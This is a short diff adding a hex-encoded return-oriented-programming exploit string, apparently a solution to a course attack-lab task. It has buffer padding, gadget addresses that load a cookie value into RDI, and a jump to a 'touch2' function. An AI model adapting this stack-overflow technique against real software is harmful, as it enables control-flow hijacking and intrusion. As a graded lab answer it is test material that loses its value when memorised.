@@ -1,0 +1,18 @@
+00 00 00 00 /* 40 bytes to fill up the input buffer. */
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+8F 5B 55 55 /* Address of add_val219 + instruction offset. */
+55 55 00 00 /* This will pop the stack into RAX */
+FA 97 B9 59 /* Value of cookie. */
+00 00 00 00
+A9 5B 55 55 /* Address of add_val426 + instruction offset of 0x2. */
+55 55 00 00 /* This will move the value of RAX into RDI. */
+C4 59 55 55 /* Address of touch2. */
+55 55 00 00
